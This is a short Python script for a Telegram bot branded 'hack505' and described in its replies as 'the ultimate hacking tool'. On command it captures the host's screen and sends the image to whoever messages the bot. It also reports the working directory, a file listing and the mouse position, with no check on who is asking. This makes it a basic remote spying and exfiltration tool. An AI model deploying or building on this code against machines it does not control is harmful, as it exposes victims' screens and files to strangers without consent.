import telegram.ext
import pyautogui
import datetime
import os

with open('token.txt', 'r') as f:
    TOKEN = f.read()


def mouse_loction(update, context):
    update.message.reply_text(f"{pyautogui.position()}")


def cwd(update, context):
    update.message.reply_text(f"{os.getcwd()}")
    print(f"{os.getcwd()}")


def ls(update, context):
    update.message.reply_text(f"{os.listdir('.')}")
    print("done")


def take_screenshot():
    # Naming file as time
    current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    # Take a screenshot and save it
    screenshot = pyautogui.screenshot()
    screenshot.save(f"{current_time}.png")
    return f"{current_time}.png"


def start(update, context):
    update.message.reply_text("Hello! welcome to hack505!")


def help(update, context):
    update.message.reply_text("""
	/start
/help
/content
	""")


def content(update, context):
    update.message.reply_text(
        "here you can find the ulimate hacking tool for free of cost!")


def screenshot(update, context):
    try:
        image_path = take_screenshot()
        update.message.reply_photo(photo=open(image_path, 'rb'))
    except Exception as e:
        update.message.reply_text(f"Error: {e}")


def kamesh(update, context):
    update.message.reply_text(
        "my name is kamesh")


def handle_text(update, context):
    user_text = update.message.text
    if user_text == f"$mouse":
        update.message.reply_text(f"{pyautogui.position()}")
    update.message.reply_text(f"You sent: {user_text}")


updater = telegram.ext.Updater(TOKEN, use_context=True)
disp = updater.dispatcher

disp.add_handler(telegram.ext.CommandHandler('start', start))
disp.add_handler(telegram.ext.CommandHandler("help", help))
disp.add_handler(telegram.ext.CommandHandler("content", content))
disp.add_handler(telegram.ext.CommandHandler("kamesh", kamesh))
# Add the new command handler
disp.add_handler(telegram.ext.CommandHandler("screen", screenshot))
disp.add_handler(telegram.ext.CommandHandler("cwd", cwd))
disp.add_handler(telegram.ext.CommandHandler("ls", ls))
disp.add_handler(telegram.ext.CommandHandler("mouse", mouse_loction))
disp.add_handler(telegram.ext.MessageHandler(
    telegram.ext.Filters.text, handle_text))

updater.start_polling()
updater.idle()
